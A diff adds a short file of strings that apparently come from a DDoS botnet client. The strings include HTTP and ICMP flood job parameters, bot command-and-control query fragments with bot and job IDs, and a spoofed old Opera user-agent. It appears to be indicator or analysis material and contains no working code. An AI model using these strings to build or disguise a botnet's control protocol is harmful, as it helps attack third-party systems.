@@ -1,0 +1,20 @@
+_JOB_HTTP_ACTION
+_JOB_HTTP_TARGET_HOST
+_JOB_HTTP_TARGET_IP
+_JOB_HTTP_PORT
+_JOB_ID
+_NEW_JOB_
+_JOB_ICMP_TARGET_IP
+_JOB_ID
+_JOB_ICMP_SEGMENT_SIZE
+_JOB_TYPE_
+_JOB_STOP_
+_JOB_RESUME_
+POST 
+-----------------------
+?cmd=info&bot_id=
+&job_status=
+&bot_id=
+?cmd=job_status&job_id=
+UserAgent: 
+Opera/9.26 (Windows NT 5.1; U; en)
